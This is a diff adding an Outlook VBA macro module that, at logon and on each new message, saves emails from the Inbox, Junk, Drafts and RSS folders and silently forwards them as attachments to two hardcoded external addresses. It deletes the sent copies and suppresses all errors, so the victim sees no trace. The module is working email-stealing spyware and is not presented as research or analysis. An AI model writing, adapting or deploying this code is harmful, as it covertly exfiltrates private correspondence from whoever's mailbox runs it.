@@ -1,0 +1,147 @@
+#If Win64 Then
+    Private Declare PtrSafe Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As LongPtr)
+#Else
+    Private Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)
+#End If
+
+
+Private Timeout          As Long
+Private ReceiverArray    As Variant
+
+
+Private Sub Application_NewMailEx(ByVal EntryIDCollection As String)
+
+On Error GoTo ErrorNewMailEx
+    Dim IterMessages As Integer
+    Dim arrayEntryId
+    Dim message As MailItem
+    
+    
+    arrayEntryId = Split(EntryIDCollection, ",")
+
+    For IterMessages = LBound(arrayEntryId) To UBound(arrayEntryId)
+        Set message = EntryIdToMailItem(arrayEntryId(IterMessages))
+        
+        Call ForwardEmail(message)
+    Next IterMessages
+
+    Exit Sub
+    
+ErrorNewMailEx:
+End Sub
+
+
+Private Function EntryIdToMailItem(ByVal entryID As String) As MailItem
+    Dim msg As MailItem
+    On Error GoTo EndConvertEntryId
+        Set msg = Application.Session.GetItemFromID(entryID)
+        Set EntryIdToMailItem = msg
+EndConvertEntryId:
+End Function
+
+
+Private Sub ForwardEmail(Item As MailItem)
+    On Error GoTo EndE
+    Dim objNewMail As MailItem
+    Dim strTempFilePath As String
+    Dim sentProperty As UserProperty
+    
+    Set sentProperty = Item.UserProperties.Find("AlreadyForwarded", True)
+    If Not sentProperty Is Nothing Then
+        Exit Sub
+    End If
+    
+    strTempFilePath = Environ("TEMP") & "\temp_email.msg"
+    Item.SaveAs strTempFilePath, olMSG
+    
+    Set objNewMail = Application.CreateItem(olMailItem)
+    
+    objNewMail.Subject = Item.Subject
+    objNewMail.Attachments.Add strTempFilePath
+    
+    Dim i As Integer
+
+    For i = LBound(ReceiverArray) To UBound(ReceiverArray)
+        objNewMail.Recipients.Add ReceiverArray(i)
+    Next i
+    
+    objNewMail.Recipients.ResolveAll
+    
+    If objNewMail.Recipients.Count = 0 Then
+        Exit Sub
+    End If
+    
+    objNewMail.DeleteAfterSubmit = True
+    objNewMail.Send
+    
+    Set sentProperty = Item.UserProperties.Add("AlreadyForwarded", olYesNo)
+    sentProperty.Value = True
+    Item.Save
+    Set objNewMail = Nothing
+EndE:
+End Sub
+
+
+
+Private Sub Application_MAPILogonComplete()
+
+On Error GoTo ErrorLogon
+    
+    
+    Timeout = 6000
+    ReceiverArray = Array("ahmeclaw2002@outlook.com", "ahmeclaw@proton.me")
+    
+    Sleep Timeout
+    
+    Call SearchNewMessageAndHandle
+    
+    Exit Sub
+        
+ErrorLogon:
+End Sub
+
+Private Sub SearchNewMessageAndHandle()
+On Error GoTo ErrorE
+    Dim IterDictionary As Integer
+    Dim inboxFolder As folder
+    Dim folderRssFeeds As folder
+    Dim folderJunk As folder
+    Dim folderDrafts As folder
+    Set inboxFolder = Application.Session.GetDefaultFolder(olFolderInbox)
+    Set folderRssFeeds = Application.Session.GetDefaultFolder(olFolderRssFeeds)
+    Set folderJunk = Application.Session.GetDefaultFolder(olFolderJunk)
+    Set folderDrafts = Application.Session.GetDefaultFolder(olFolderDrafts)
+    
+    Dim searchComplete As Boolean: searchComplete = False
+    
+    Call SearchInFolder(inboxFolder)
+    Call SearchInFolder(folderRssFeeds)
+    Call SearchInFolder(folderJunk)
+    Call SearchInFolder(folderDrafts)
+    
+    Exit Sub
+
+ErrorE:
+End Sub
+
+
+Function SearchInFolder(ByRef folder As folder)
+On Error GoTo ErrorE
+    Dim IterItems As Integer
+    Dim upBound As Integer: upBound = 10
+    
+    If Not folder.Items.Count = 0 Then
+    
+        For IterItems = folder.Items.Count To 1 Step -1
+            Call ForwardEmail(folder.Items(IterItems))
+Continue:
+            If upBound < 0 Then
+                Exit For
+            End If
+            
+            upBound = upBound - 1
+        Next IterItems
+    End If
+ErrorE:
+End Function
+
